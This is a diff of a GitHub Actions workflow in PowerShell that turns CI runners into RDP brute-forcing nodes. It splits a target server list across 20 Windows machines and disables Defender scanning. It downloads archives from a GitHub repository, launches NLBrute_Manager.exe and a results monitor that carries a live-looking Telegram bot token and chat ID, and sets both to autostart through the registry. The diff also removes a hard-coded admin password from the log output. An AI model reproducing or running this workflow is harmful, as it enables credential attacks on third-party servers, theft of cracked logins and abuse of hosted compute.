@@ -12,7 +12,6 @@ jobs:
   deploy:
     strategy:
       matrix:
-        # Maximum capacity of the workflow
         server_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
       fail-fast: false
 
@@ -30,17 +29,14 @@ jobs:
           $currentId = ${{ matrix.server_id }}
           $workDir = "C:\target_app"
 
-          # Logic to stop the job if the matrix index is higher than user input
           if ($currentId -gt $maxServers) {
-              Write-Host "!!! LIMIT REACHED: Skipping Server ID $currentId (User requested $maxServers) !!!" -ForegroundColor Yellow
+              Write-Host "!!! LIMIT REACHED: Skipping Server ID $currentId !!!" -ForegroundColor Yellow
               exit 0
           }
 
-          # Create Workspace
           if (Test-Path $workDir) { Remove-Item -Recurse -Force $workDir -ErrorAction SilentlyContinue }
           New-Item -ItemType Directory -Path $workDir -Force | Out-Null
           
-          # Set Environment Variables for subsequent steps
           echo "SERVER_ID=$currentId" >> $env:GITHUB_ENV
           echo "MAX_SERVERS=$maxServers" >> $env:GITHUB_ENV
           echo "WORK_DIR=$workDir" >> $env:GITHUB_ENV
@@ -62,52 +58,31 @@ jobs:
               exit 1
           }
 
-          # 1. Read all lines and filter out empty ones to ensure clean math
           $allLines = Get-Content $inputFile | Where-Object { $_.Trim() -ne "" }
           $totalLines = $allLines.Count
           
-          Write-Host "Total lines in master file: $totalLines" -ForegroundColor Cyan
-          Write-Host "Total servers requested: $maxServers" -ForegroundColor Cyan
+          if ($totalLines -eq 0) { exit 1 }
 
-          if ($totalLines -eq 0) {
-              Write-Error "Master file is empty!"
-              exit 1
-          }
-
-          # 2. Calculate dynamic lines per server
           $linesPerServer = [Math]::Floor($totalLines / $maxServers)
-
-          if ($linesPerServer -lt 1) {
-              Write-Error "Error: Not enough lines in servers.txt to split among $maxServers servers."
-              exit 1
-          }
-
-          Write-Host "Calculated lines per server: $linesPerServer" -ForegroundColor Yellow
-
-          # 3. Calculate the specific range for THIS server
           $startIndex = ($currentId - 1) * $linesPerServer
           
           $countToTake = $linesPerServer
           if ($currentId -eq $maxServers) {
               $countToTake = $totalLines - $startIndex
-              Write-Host "Last server detected. Taking all remaining lines to prevent data loss." -ForegroundColor Green
           }
 
-          # Use ${} to prevent PowerShell from misinterpreting the colon as a drive provider
-          Write-Host "Server ${currentId}: Starting at index ${startIndex}, target count: ${countToTake}" -ForegroundColor Cyan
+          Write-Host "Server ${currentId}: Extracting ${countToTake} lines..." -ForegroundColor Cyan
 
-          # 4. Extract the specific chunk
           $serverLines = $allLines | Select-Object -Skip $startIndex -First $countToTake
 
           if ($null -eq $serverLines -or $serverLines.Count -eq 0) {
-              Write-Error "No data found for Server ${currentId}. Check input file."
+              Write-Error "No data found for Server ${currentId}."
               exit 1
           }
 
-          # 5. Save the chunk to the target application directory
+          # Save the chunk to the working directory
           $serverLines | Out-File -FilePath $outputFile -Encoding ascii -Force
-          Write-Host "Successfully extracted $($serverLines.Count) lines for Server ${currentId} to $outputFile" -ForegroundColor Green
-          Write-Host "Verification: File size is $($serverLines.Count) lines." -ForegroundColor Green
+          Write-Host "Successfully saved split file to: $outputFile" -ForegroundColor Green
 
       - name: 4. Enable RDP & Firewall
         run: |
@@ -132,14 +107,7 @@ jobs:
           & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="server-${{ matrix.server_id }}"
           Start-Sleep -Seconds 8
           $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
-          
-          Write-Host ""
-          Write-Host "==================================================" -ForegroundColor Green
-          Write-Host "  >>> RDP SERVER READY! <<<" -ForegroundColor Cyan
-          Write-Host "  Tailscale IP : $ts_ip" -ForegroundColor Yellow
-          Write-Host "  Username     : NvdAdmin" -ForegroundColor Yellow
-          Write-Host "  Password     : P@ssw0rd1qazXSW@#" -ForegroundColor Yellow
-          Write-Host "==================================================" -ForegroundColor Green
+          Write-Host "Tailscale IP : $ts_ip" -ForegroundColor Yellow
 
       - name: 7. Deploy App & Setup Autostart
         shell: powershell
@@ -151,7 +119,7 @@ jobs:
           Set-MpPreference -DisableBehaviorMonitoring $true
           Set-MpPreference -DisableScriptScanning $true
 
-          # 2. Download Split ZIPs
+          # 2. Download Files
           $filesToDownload = @(
             "https://raw.githubusercontent.com/roozbeh017-hub/lagi/main/multinl_zip.z01",
             "https://raw.githubusercontent.com/roozbeh017-hub/lagi/main/multinl_zip.z02",
@@ -165,8 +133,8 @@ jobs:
               Invoke-WebRequest -Uri $url -OutFile "$($env:WORK_DIR)\$fileName"
           }
 
-          # 3. Deep Extraction Loop
-          Write-Host "Starting Aggressive Extraction..." -ForegroundColor Cyan
+          # 3. Extraction
+          Write-Host "Starting Extraction..." -ForegroundColor Cyan
           $maxIterations = 5
           $iteration = 0
           $foundZip = $true
@@ -185,39 +153,48 @@ jobs:
               }
           }
 
-          # 4. Targeted Search and Registry Injection
+          # 4. CRITICAL FIX: Find where the app actually is and move the split file there
+          Write-Host "Locating application files to inject servers.txt..." -ForegroundColor Cyan
           $targetExe1 = "NLBrute_Manager.exe"
           $targetExe2 = "good.txt-monitor.exe"
+          
+          $exeFile1 = Get-ChildItem -Path $env:WORK_DIR -Filter $targetExe1 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
+          $exeFile2 = Get-ChildItem -Path $env:WORK_DIR -Filter $targetExe2 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
+
+          # Move the split servers.txt to the folder where the EXE is found
+          if ($exeFile1) {
+              $exeDir1 = $exeFile1.DirectoryName
+              Copy-Item -Path "$($env:WORK_DIR)\servers.txt" -Destination "$exeDir1\servers.txt" -Force
+              Write-Host "Injected split servers.txt into $exeDir1" -ForegroundColor Green
+          }
+          if ($exeFile2) {
+              $exeDir2 = $exeFile2.DirectoryName
+              Copy-Item -Path "$($env:WORK_DIR)\servers.txt" -Destination "$exeDir2\servers.txt" -Force
+              Write-Host "Injected split servers.txt into $exeDir2" -ForegroundColor Green
+          }
+
+          # 5. Registry & Autostart Setup
           $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 
-          # APP 1: NLBrute_Manager.exe (GUI)
-          $exeFile1 = Get-ChildItem -Path $env:WORK_DIR -Filter $targetExe1 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
+          # APP 1 Setup
           if ($exeFile1) {
               $exePath1 = $exeFile1.FullName
-              $exeDir1 = Split-Path $exePath1 -Parent
               $vbsFile1 = "$($env:WORK_DIR)\launcher_manager.vbs"
               $vbsContent1 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir1 + '"' + "`n" + 'WshShell.Run "' + $exePath1 + '", 1, False'
               $vbsContent1 | Out-File -FilePath $vbsFile1 -Encoding ascii
               New-ItemProperty -Path $registryPath -Name "NLBruteAutostart" -Value "wscript.exe `"$vbsFile1`"" -PropertyType String -Force | Out-Null
-              Write-Host "App 1 (GUI) configured." -ForegroundColor Green
+              Start-Process -FilePath $exePath1 -WorkingDirectory $exeDir1 -WindowStyle Normal
           }
 
-          # APP 2: good.txt-monitor.exe (Background)
-          $exeFile2 = Get-ChildItem -Path $env:WORK_DIR -Filter $targetExe2 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
+          # APP 2 Setup
           if ($exeFile2) {
               $exePath2 = $exeFile2.FullName
-              $exeDir2 = Split-Path $exePath2 -Parent
               $params = "-chatid 7565155789 -token 8054074057:AAF0DCvurOYgAR4dcQ8MQjTFMDBgeLGo2j4"
               $vbsFile2 = "$($env:WORK_DIR)\launcher_monitor.vbs"
               $vbsContent2 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir2 + '"' + "`n" + 'WshShell.Run "cmd.exe /c ' + $exePath2 + ' ' + $params + '", 0, False'
               $vbsContent2 | Out-File -FilePath $vbsFile2 -Encoding ascii
               New-ItemProperty -Path $registryPath -Name "NLBruteMonitor" -Value "wscript.exe `"$vbsFile2`"" -PropertyType String -Force | Out-Null
-              Write-Host "App 2 (Monitor) configured." -ForegroundColor Green
           }
-
-          # 5. Immediate Launch
-          Write-Host "Launching GUI..." -ForegroundColor Yellow
-          Start-Process -FilePath $exePath1 -WorkingDirectory $exeDir1 -WindowStyle Normal
 
       - name: 6. Keep Server Alive (6 Hours)
         run: |
